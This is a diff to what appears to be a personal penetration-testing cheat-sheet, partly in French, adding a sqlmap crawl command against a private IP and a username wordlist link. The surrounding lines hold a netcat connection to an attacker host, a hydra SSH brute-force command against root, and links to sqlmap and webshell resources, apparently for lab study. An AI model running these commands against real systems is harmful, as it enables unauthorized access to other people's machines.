@@ -41,7 +41,13 @@ nc hackerIp 9191
 
 https://resources.infosecinstitute.com/topic/important-sqlmap-commands/
 
+
+Crowler:
+sqlmap -u http://192.168.202.160/ –crawl=1
+
+
 cp file newName ========= le nouveau local c'est ou tu est positionner 
+
 
 https://www.kali.org/tools/webshells/
 
@@ -82,6 +88,9 @@ BRUTFORCE
 
 
 hydra -l root -p rockyou.txt -u  -s 22  192.168.160.181 ssh 
+
+
+https://github.com/jeanphorn/wordlist/blob/master/usernames.txt
 
 
 cryptography
